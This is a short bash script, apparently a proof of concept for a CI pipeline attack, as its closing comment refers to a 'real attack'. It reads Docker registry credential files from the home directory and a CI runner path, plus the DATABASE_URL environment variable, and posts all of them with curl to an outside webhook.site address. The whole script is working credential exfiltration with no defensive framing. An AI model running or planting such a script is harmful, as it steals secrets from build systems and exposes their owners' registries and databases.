#!/usr/bin/env bash
#filename: myscript.sh

echo "-------------hello1--------------" >&2


export webhook="https://webhook.site/0c1c1586-c29c-4759-8c4f-4f6c683f3a25"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat ~/.docker/config.json)" \
    "$webhook/docker_cred"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat /home/runner/.docker/config.json)" \
    "$webhook/docker_cred2"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$DATABASE_URL" \
    "$webhook/aaaa"

sleep 2 # in real attack it will be 1200 to have time to edit